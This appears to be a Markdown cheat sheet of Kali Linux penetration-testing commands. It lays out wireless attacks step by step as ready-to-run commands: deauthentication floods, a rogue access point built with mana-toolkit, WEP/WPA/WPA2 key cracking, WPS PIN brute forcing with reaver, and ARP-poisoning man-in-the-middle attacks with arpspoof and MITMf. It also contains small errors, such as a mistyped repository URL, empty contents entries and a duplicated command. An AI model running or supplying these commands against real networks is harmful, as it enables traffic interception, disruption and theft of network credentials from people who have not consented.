#Pen Testing


##Table of Contents

1. [Operating System](#operating-system)
2. [Passive reconaissance](#passive-reconaissance)
3. [Enabling monitor mode](#enabling-monitor-mode)
4. [Capturing packets](#capturing-packets)
5. [Creating Fake AccessPoint](#creating-fake-accesspoint)
6. [Cracking WEP/WPA/WPA2](#cracking-wep/wpa/wpa2)
7. [Information Gathering](#information-gathering)
8. [](#)
9. [](#)

##Operating System

Kali Linux does not enable any externally-listening network services, some are installed but need to be enabled prior to use.

###Secure Shell

- Disable default keys and generate a new SSH key pair, backup the old ones.

`cd /etc/ssh/`

`mkdir default_keys`

`mv ssh_host_* default_keys`

`dpkg reconfigure openssh-server`

- Start ssh service

`/etc/init.d/ssh start`

- Stop ssh service

`/etc/init.d/ssh stop`

###Updating Kali

- Adding package repositories

`echo deb http://http.kali.org/kiali main contrib non-free >> /etc/apt/sources.list`

- Possible repos

`## Bleeding Edge repository`
`deb http://repo.kali.org/kali kali-bleeding-edge main`

`## Kali`
`deb http://http.kali.org/kali kali main contrib non-free  `

`## Kali-dev`
`deb http://http.kali.org/kali kali-dev main contrib non-free`

`## Kali Security updates     `
`deb http://security.kali.org/kali-security kali/updates main contrib non-free `

- Keep repos up-to-date

`apt-get update`

`apt-get upgrade`

`apt-get dist-upgrade`

- Reset root password

`passwd root`

- Adding user

`adduser NAME`

- View wireless card

`iwconfig`

- Change mac-address

`macchanger -OPTIONS`

##Passive Reconnaissance

###Usefull sites 

- (www.exploit-db.com/google-dorks)

- (www.yandex.com)

- (www.searchenginecolossus.com)

- (www.zuula.com)

- (www.dnsstuf.com)

- (www.serversniff.com)

- (www.netcraft.com)

- (myIPneighbors.com)

- (www.shodanHQ.com)

- site:pastebin.com "targetURL"


##Enabling monitor mode

**Card has to be shutdown before changing, use `ifconfig INTERFACE down/up`**

###First method

- Changing managed mode on wireless card

`airmon-ng start INTERFACE`

- Change wireless back to managed mode

`airmon-ng stop INTERFACE`

###Second method

- Changing managed mode on wireless card

`iwconfig INTERFACE mode monitor`

- Change wireless back to managed mode

`airmon-ng stop INTERFACE`

###Third method

- Changing managed mode on wireless card

`airmon-ng check kill`

`airmon-ng start INTERFACE`

- Change wireless back to managed mode

`airmon-ng stop INTERFACE`

##Capturing packets

- Show networks

`airodump-ng INTERFACE`

- Target specific network

`airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX --write PATH/FILENAME INTERFACE`

- Analyse captured packets with Wireshark (if not encrypted)

###Deauthentication Atack

- Show needed information 

`airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX INTERFACE`

- Disconnect target

`aireplay-ng --deauth 10000 -a NETWORKMAC -c TARGETMAC INTERFACE`

##Creating Fake AccessPoint

- Install mana-toolkit

`apt-get install mana-toolkit`

###AP with internet connection

- Adjust settings

`gedit /etc/mana-toolkit/hostapd-mana.conf` adjust accordingly

`gedit /usr/share/mana-toolkit/run-mana/start-nat-simple.sh` adjust accordingly

- Launch AP

`bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`

##Cracking WEP/WPA/WPA2

###WEP with traffic

- Sniff packets while simultaneous trying to crack key

`airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX --write PATH/FILENAME INTERFACE`

`aircrack-ng PATH/FILENAME`

remove the "`:`" from the found key and use it

###WEP with little traffic

- Establish fake connection

`aireplay-ng --fakeauth 0 -a NETWORKMAC -h OWNMAC INTERFACE`

- Inject packages 

`aireplay-ng --arpreplay -b NETWORKMAC -h OWNMAC INTERFACE`

- Sniff packets while simultaneous trying to crack key

`airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX --write PATH/FILENAME INTERFACE`

`aircrack-ng PATH/FILENAME`

###WPS

- Find any WPS-compatible APs

`wash -i INTERFACE`

- Bruteforce the pin

`reaver -b NETWORKMAC -c X INTERFACE`

###WPA

- Capture the handshake

`airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX --write PATH/FILENAME INTERFACE`

`aireplay-ng --deauth 4 -a NETWORKMAC -c TARGETMAC INTERFACE`

- Create wordlist (can also download one)

`crunch MIN MAX CHARACTERSTOBEUSED -t PATTERN -o FILENAME`

e.g. `crunch 6 8 123456abcd!"€$% -o wordlist -t a@@@@b`

- Determine WPA key

`aircrack-ng HANDSHAKEFILE -w WORDLIST`

##Information gathering (once connected)

**place INTERFACE back in managed mode**

###Method 1

- Capture info (quik)

`netdiscover -i INTERFACE -r IPADDRES/SUBNET`

###Method 2 (needs to be installed)

- Capture info with graphical interface

`netdiscover -i INTERFACE -r IPADDRES/SUBNET`

###Method 3

- Capture info (extensive)

`zenmap` Follow the GUI

##Man In The Middle (MITM)

###ARP Poisoning (arpsoof)

- Make the target client believe you are the AP

`arpspoof -i INTERFACE -t TARGET_IP AP_IP`

- Make the AP believe your are the client

`arpspoof -i INTERFACE -t AP_IP TARGET_IP`

- Enable IP forward without dropping

`echo 1 > /proc/sys/net/ipv4/ip_forward`

###ARP Poisoning (MITMf)

- Fool client and AP

`mitmf --arp --spoof --gateway AP_IP --target TARGET_IPs -i INTERFACE`

- Enable IP forwarding without dropping

`echo 1 > /proc/sys/net/ipv4/ip_forward`



##Useful links

(http://www.mediacollege.com/linux/command/linux-command.html)

